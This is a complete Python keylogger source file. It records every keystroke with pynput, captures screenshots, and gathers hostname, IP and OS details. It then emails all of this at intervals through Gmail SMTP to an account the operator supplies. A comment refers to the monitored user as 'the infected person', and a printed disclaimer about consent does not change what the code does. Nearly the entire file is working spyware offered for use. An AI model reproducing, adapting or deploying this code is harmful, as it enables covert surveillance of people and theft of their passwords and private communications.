# Created by Shreevathsa GP
import datetime
import time
import smtplib
import email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from email.mime.application import MIMEApplication
import pynput
from pynput.keyboard import Key, Listener
import pyscreenshot
import pyscreenshot as screen_capture
import socket
import platform
import sys
from sys import platform as plat
import os
from getpass import getpass

def clear():
    _ = os.system('clear') # Makes the terminal window clean, so that the next printed line, shows up at the top

print('\n\n\n')
clear()
print('If you wish to continue with this software, please read through the following terms and conditions carefully:'
      '\n\na) Give terminal or command prompt full access to system files, Accessibility and keystroke monitoring, '
      'as without this program will not run.'
      '\nb) I, the programmer of this software am in no circumstances responsible, for anything you do with this '
      'software, once'
      'you have downloaded it locally on your laptop, it is no longer my responsibility in any manner or form, and you ' 
      'may do any legal thing you wish with it.'
      "\nc) Please refrain from sending or installing this key logger software on to any system, without the user's "
      "permission, this is against the law, and I the maker of the software am not responsible ethically or legally."
      "\nd) Because this logger works on the basis of sending emails (@gmail.com only), you must turn the ability for"
      "secure apps, to access the account, or else this will not work!")

print('\n\n\n')
verdict = input("Do you comply with the terms and regulations and agree to the fact that I the programmer am in "
                "no way tied to or responsible for you the user's actions with this software? (y/n)")
print('\n\n')
if verdict == "yes" or verdict == "y":
    clear()
    wait = input('How often would you like a log sent to your mail (minutes)?')
    try:
        wait = int(wait)
    except:
        print('\n   Please enter an integer time value (minutes)')
        exit()

    print('\n\n')
    clear()
    email_id = input('Which account would you like the log to be sent to (@gmail.com)?\n    Email: ')
    passd = getpass('    Password: ')

    try:
        test_mail = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
        test_mail.starttls()
        test_mail.login(email_id, password=passd)
        test_mail.close()
    except:
        print('\n\n !USERNAME AND OR YOUR PASSWORD IS WRONG, PLEASE RETRY WITH VALID CREDENTIALS!')
        exit()

    if str(email_id).find('@gmail.com') == -1:
        print('\n   Please enter a valid @gmail.com email address')
        exit()
    else:
        pass
    print('\n')
    clear()
    print('Log started on: {}'.format(datetime.datetime.now().replace(microsecond=0)))
    pass
elif verdict == "no" or verdict == "n":
    print('Hope to see you again! Goodbye!')
    exit()
else:
    print('Hope to see you again! Goodbye!')
    exit()

password = passd

dir_path = '{}/Logger'.format(os.path.expanduser('~'))

if os.path.isdir(dir_path):
    pass
else:
    os.makedirs(dir_path)

screenshot_path = '{}/Logger/screenshot.png'.format(os.path.expanduser('~'))
computer_information_path = '{}/Logger/computer_info.txt'.format(os.path.expanduser('~'))
keylog_path = '{}/Logger/log.txt'.format(os.path.expanduser('~'))

with open(keylog_path, 'w') as file:
    file.write(' ')
    file.close()
with open(computer_information_path, 'w') as file:
    file.write(' ')
    file.close()

current_datetime = datetime.datetime.now()

current_time = time.localtime()

now = datetime.datetime.now()


wait_time = float(wait)  # Minutes
send_time = now + datetime.timedelta(minutes=wait_time)

iteration_limit_counter = 0

iteration_limit = 1000
count = 0
keys = []

# This all_keys is kept like this so, that if the infected person starts with a series of backspaces, no
# important info is deleted
all_keys = ['_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_',
            '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_',
            '_','_''_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_',
            '_', '_' , '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_',
            '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_',
            '_', '_', '_', '_', '\n', '\n', '\n', '\n', '\n', '\n', '\n', '\n', '\n', '\n', '\n', '\n']

iterations = 0


def screenshot():
    image = screen_capture.grab()
    image.save(screenshot_path)  # .format(current_datetime))


def computer_information():
    host_name = socket.gethostname()
    IP = socket.gethostbyname(host_name)

    with open(computer_information_path, 'w') as file:
        file.write("\nSystem: {}, {}".format(platform.system(), platform.version()))
        file.write("\nProcessor: {}".format(platform.processor()))
        file.write("\nMachine: {}".format(platform.machine()))
        file.write("\nHost Name: {}".format(host_name))
        file.write("\nIP Address: {}".format(IP))
        file.close()


def organize_file(iteration_counter):
    global iteration_limit_counter
    if iteration_counter % 1 == 0:
        iteration_limit_counter += 1

        with open(keylog_path, 'w') as log:
            for key in all_keys:
                k = str(key).replace("'", "")
                if k.find('space') > 0:
                    log.write('\n')
                elif str(key).find('shift') > 0:
                    log.write('\n <<shift pressed>>\n')
                elif str(key).find('down') > 0:
                    log.write('\n <<down pressed>>\n')
                elif str(key).find('up') > 0:
                    log.write('\n <<up pressed>>\n')
                elif str(key).find('right') > 0:
                    log.write('\n <<right pressed>>\n')
                elif str(key).find('left') > 0:
                    log.write('\n <<left pressed>>\n')
                elif str(key).find('tab') > 0:
                    log.write('\n <<tab pressed>>, ')
                elif str(key).find('Key.caps_lock') > 0:
                    log.write('\n <<caps_lock pressed>>\n')
                elif str(key).find('ctrl') > 0:
                    log.write('\n <<ctrl pressed>>\n')
                elif str(key).find('cmd_r') > 0:
                    log.write('\n <<cmd_r pressed>>\n')
                elif str(key).find('alt_r') > 0:
                    log.write('\n <<alt_r pressed>>\n')
                elif str(key).find('enter') > 0:
                    log.write('\n <<enter pressed>>\n')
                else:
                    log.write(k)
            log.close()
    else:
        pass

def send_email(email_address, password):
    # print(datetime.datetime.now())
    # print(send_time)

    # print('Sending email....')
    # For the email to work, 2-step verification should be turned off, and the permissions for logging
    # in should include allow secure applications

    address_from = email_address
    address_to = email_address

    msg = MIMEMultipart()
    msg['From'] = address_from
    msg['To'] = address_to

    msg['Subject'] = "{}'s Log - {}".format(socket.gethostname(), datetime.datetime.now().replace(microsecond=0))

    body = "Please Find Attached: \na) Log.txt containing keylog of {}\nb) Screenshot from {}\nc) The User " \
           "information\n\nRegards,\nLogger".format(datetime.datetime.now().replace(microsecond=0),
                                                    datetime.datetime.now().replace(microsecond=0))

    msg.attach(MIMEText(body, 'plain'))

    log_file = "log.txt"  # .format(current_datetime)
    screenshot_file = "logshot.png"
    user_info_file = "UserInfo.txt"

    attachment_1 = MIMEApplication(open(keylog_path, 'rb').read(), _subtype='txt')
    attachment_1.add_header('Content-Disposition', "attachment; filename= %s" % log_file)
    msg.attach(attachment_1)

    if plat == 'darwin':
        pass
    elif plat.find('win') > 0 or plat.find('linux') > 0:
        attachment_2 = MIMEApplication(open(screenshot_path, 'rb').read(), _subtype='png')
        attachment_2.add_header('Content-Disposition', "attachment; filename= %s" % screenshot_file)
        msg.attach(attachment_2)

    attachment_3 = MIMEApplication(open(computer_information_path, 'rb').read(), _subtype='txt')
    attachment_3.add_header('Content-Disposition', "attachment; filename= %s" % user_info_file)
    msg.attach(attachment_3)

    mail = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
    mail.starttls()
    mail.login(address_from, password=password)
    text = msg.as_string()
    mail.sendmail(address_from, address_to, text)
    mail.quit()

    # print("Sent email!")

while type(2) == int:
    send = True
    def on_press(key):
        global keys, count, all_keys
        # keys.append('a', 'b', 'c', 'd')
        # print(key)
        keys.append(key)
        all_keys.append(key)
        count += 1

        if count >= 1:
            count = 0
            write_file(keys)
            # print('all keys:', all_keys)
            # print('keys:', keys)
            keys = []
    def write_file(keys):
        global iterations
        with open(keylog_path, 'a') as log:
            for key in keys:
                iterations += 1
                if str(key).find('backspace') > 0:
                    factored_key = all_keys[all_keys.index(key) - 2]
                    all_keys.pop(all_keys.index(key) - 1)
                    all_keys.pop(all_keys.index(key))
                else:
                    factored_key = all_keys[all_keys.index(key)]

                refined_key = str(factored_key).replace("'", "")
                if refined_key.find('space') > 0:
                    log.write('\n')
                    log.close()
                else:
                    log.write(refined_key)
                    log.close()
                    organize_file(iteration_counter=iterations)
        # print(all_keys)


    def on_release(key):
        if datetime.datetime.now() > send_time:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if datetime.datetime.now() > send_time:
        #print('checking')
        #print('Sending.....')
        if plat == 'darwin':
            pass
        elif plat.find('win') != -1:
            screenshot()
        elif plat.find('linux') != -1:
            screenshot()

        computer_information()
        try:
            send_email(str(email_id), password=password)
            # Clear contents of file
            with open(keylog_path, 'w') as file:
                file.write(' ')
                file.close()
            all_keys.clear()

            all_keys = ['_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_',
                        '_',
                        '_',
                        '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_',
                        '_',
                        '_',
                        '_', '_''_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_',
                        '_',
                        '_', '_',
                        '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_',
                        '_',
                        '_',
                        '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_', '_',
                        '_',
                        '_',
                        '_', '_', '_', '_', '\n', '\n', '\n', '\n', '\n', '\n', '\n', '\n', '\n', '\n', '\n', '\n']
        except:
            print('\n\nLog failed to send email at: {}\n'.format(datetime.datetime.now().replace(microsecond=0)))
            pass
        send_time = datetime.datetime.now() + datetime.timedelta(minutes=wait_time)
        #print('Sent!!')

# One last send before programme is stopped
if plat == 'darwin':
    pass
elif plat.find('win') != -1:
    screenshot()
elif plat.find('linux') != -1:
    screenshot()

computer_information()
try:
    send_email(str(email_id), password=password)
except:
    pass
print('\nLog ended on: {}'.format(datetime.datetime.now().replace(microsecond=0)))

"""
Trial Area:

"""

# Created by Shreevathsa GP
